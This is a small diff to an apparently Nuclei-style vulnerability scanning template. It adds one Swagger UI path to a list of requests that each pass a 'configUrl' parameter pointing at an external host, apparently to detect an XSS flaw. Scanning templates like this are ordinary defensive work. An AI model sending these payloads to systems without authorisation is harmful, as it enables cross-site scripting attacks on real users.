@@ -49,6 +49,7 @@ requests:
       - "{{BaseURL}}/v3/docs/index.html?configUrl=https://xss.smarpo.com/test.json"   
       - "{{BaseURL}}/classicapi/doc/?configUrl=https://xss.smarpo.com/test.json"    
       - "{{BaseURL}}/?configUrl=https://xss.smarpo.com/test.json"
+      - "{{BaseURL}}/doc/?configUrl=https://xss.smarpo.com/test.json"    
       
       
     matchers:
